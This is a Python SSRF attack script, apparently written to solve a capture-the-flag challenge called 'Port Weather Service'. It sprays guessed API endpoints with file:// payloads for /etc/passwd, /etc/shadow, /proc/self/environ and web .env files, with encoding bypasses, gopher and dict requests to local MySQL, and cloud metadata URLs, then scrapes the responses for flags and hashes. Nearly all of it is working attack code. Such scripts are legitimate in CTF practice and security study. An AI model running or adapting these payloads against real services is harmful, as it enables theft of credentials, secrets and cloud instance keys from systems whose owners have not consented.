#!/usr/bin/env python3
import requests
import re
import time
import base64
from urllib.parse import quote

class FlagHunter:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.flag_pattern = re.compile(r'CCOI26\{[^}]+\}', re.IGNORECASE)
        self.found_flags = []
    
    def test_ssrf_flag_extraction(self):
        """Test various SSRF payloads to extract flags"""
        
        # File paths where flags might be stored
        flag_files = [
            'file:///flag.txt',
            'file:///home/flag.txt',
            'file:///app/flag.txt',
            'file:///tmp/flag.txt',
            'file:///var/www/flag.txt',
            'file:///etc/flag.txt',
            'file:///root/flag.txt',
            'file:///opt/flag.txt',
            'file:///usr/local/flag.txt',
            'file:///challenge/flag.txt',
            'file:///ctf/flag.txt',
            'file:///home/user/flag.txt',
            'file:///home/ctf/flag.txt'
        ]
        
        # Environment files that might contain flags
        env_files = [
            'file:///proc/self/environ',
            'file:///proc/1/environ',
            'file:///proc/cmdline',
            'file:///proc/version',
            'file:///etc/environment',
            'file:///etc/profile',
            'file:///home/.bashrc',
            'file:///root/.bashrc'
        ]
        
        # Web application files
        web_files = [
            'file:///var/www/html/index.html',
            'file:///var/www/html/config.php',
            'file:///var/www/html/.env',
            'file:///var/www/html/flag.php',
            'file:///var/www/html/flag.html',
            'file:///var/www/flag.txt',
            'file:///var/www/html/robots.txt',
            'file:///var/www/html/sitemap.xml'
        ]
        
        # Configuration files
        config_files = [
            'file:///etc/passwd',
            'file:///etc/shadow',
            'file:///etc/hosts',
            'file:///etc/hostname',
            'file:///etc/issue',
            'file:///etc/motd',
            'file:///etc/config',
            'file:///etc/flag',
            'file:///etc/ctf'
        ]
        
        all_files = flag_files + env_files + web_files + config_files
        
        results = []
        for file_path in all_files:
            print(f"Testing: {file_path}")
            result = self.test_payload(file_path)
            if result:
                results.append(result)
                flags = self.extract_flags(result.get('response', ''))
                if flags:
                    self.found_flags.extend(flags)
                    print(f"🚀 FOUND FLAGS: {flags}")
            time.sleep(0.5)  # Rate limiting
        
        return results
    
    def test_payload(self, payload):
        """Test a single SSRF payload"""
        endpoints = [
            '/api/weather',
            '/api/fetch',
            '/api/data',
            '/api/proxy',
            '/weather',
            '/fetch',
            '/proxy',
            '/api/v1/weather',
            '/v1/weather',
            '/api/external',
            '/external'
        ]
        
        for endpoint in endpoints:
            try:
                # Test POST request
                data = {'url': payload}
                response = self.session.post(f"{self.base_url}{endpoint}", 
                                            data=data, timeout=10)
                
                if response.status_code == 200 and len(response.text) > 0:
                    return {
                        'payload': payload,
                        'endpoint': endpoint,
                        'method': 'POST',
                        'status': response.status_code,
                        'response': response.text,
                        'content_type': response.headers.get('content-type', '')
                    }
            except Exception as e:
                continue
            
            try:
                # Test GET request
                params = {'url': payload}
                response = self.session.get(f"{self.base_url}{endpoint}", 
                                           params=params, timeout=10)
                
                if response.status_code == 200 and len(response.text) > 0:
                    return {
                        'payload': payload,
                        'endpoint': endpoint,
                        'method': 'GET',
                        'status': response.status_code,
                        'response': response.text,
                        'content_type': response.headers.get('content-type', '')
                    }
            except Exception as e:
                continue
        
        return None
    
    def extract_flags(self, text):
        """Extract flags from text"""
        if not text:
            return []
        
        # Try different flag patterns
        patterns = [
            r'CCOI26\{[^}]+\}',
            r'flag\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'CTF\{[^}]+\}',
            r'[A-Z0-9_]+\{[^}]+\}',
            r'[a-f0-9]{32}',  # MD5 hashes
            r'[a-f0-9]{40}',  # SHA1 hashes
            r'[a-f0-9]{64}'   # SHA256 hashes
        ]
        
        flags = []
        for pattern in patterns:
            matches = re.findall(pattern, text, re.IGNORECASE)
            flags.extend(matches)
        
        return list(set(flags))  # Remove duplicates
    
    def test_ssrf_bypass_for_flags(self):
        """Test SSRF bypass techniques specifically for flag extraction"""
        bypass_payloads = [
            # URL encoding
            'file:///flag.txt',
            'file:///flag.txt%00',
            'file:///flag.txt%20',
            'file:///flag.txt%0a',
            
            # Double encoding
            'file://%2f%2fflag.txt',
            'file://%2f%2f%2fflag.txt',
            
            # Unicode encoding
            'file:///f%6cag.txt',
            'file:///fl%61g.txt',
            
            # Path traversal variations
            'file:///etc/passwd%00flag.txt',
            'file:///var/www/html/../../flag.txt',
            'file:///proc/self/cwd/flag.txt',
            'file:///proc/self/root/flag.txt',
            
            # Alternative protocols
            'ftp://127.0.0.1/flag.txt',
            'dict://127.0.0.1:3306/',
            'gopher://127.0.0.1:3306/_',
            
            # Localhost variations
            'file://localhost/flag.txt',
            'file://127.0.0.1/flag.txt',
            'file://0.0.0.0/flag.txt',
            
            # Cloud metadata (might contain flags)
            'http://169.254.169.254/latest/meta-data/',
            'http://metadata.google.internal/',
            'http://100.100.100.200/latest/meta-data/'
        ]
        
        results = []
        for payload in bypass_payloads:
            print(f"Testing bypass: {payload}")
            result = self.test_payload(payload)
            if result:
                results.append(result)
                flags = self.extract_flags(result.get('response', ''))
                if flags:
                    self.found_flags.extend(flags)
                    print(f"🚀 FOUND FLAGS: {flags}")
            time.sleep(0.3)
        
        return results
    
    def monitor_service(self, interval=60):
        """Monitor service for availability"""
        print(f"Monitoring {self.base_url} for availability...")
        
        while True:
            try:
                response = requests.get(self.base_url, timeout=5)
                if response.status_code == 200:
                    print(f"✅ Service is UP! Status: {response.status_code}")
                    print("Starting flag extraction...")
                    
                    # Start automated flag hunting
                    self.test_ssrf_flag_extraction()
                    self.test_ssrf_bypass_for_flags()
                    
                    if self.found_flags:
                        print(f"🎉 FOUND FLAGS: {self.found_flags}")
                        break
                    else:
                        print("No flags found yet, continuing to monitor...")
                else:
                    print(f"Service responding with status: {response.status_code}")
            except Exception as e:
                print(f"Service still down: {e}")
            
            time.sleep(interval)

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) != 2:
        print("Usage: python3 flag_hunter.py <target_url>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    hunter = FlagHunter(target_url)
    
    print("🎯 Starting Flag Hunter for Port Weather Service CTF")
    print(f"Target: {target_url}")
    print("=" * 50)
    
    # Try immediate flag extraction
    print("Testing immediate flag extraction...")
    hunter.test_ssrf_flag_extraction()
    hunter.test_ssrf_bypass_for_flags()
    
    if hunter.found_flags:
        print(f"🎉 FLAGS FOUND: {hunter.found_flags}")
    else:
        print("No flags found immediately. Starting monitoring mode...")
        hunter.monitor_service()
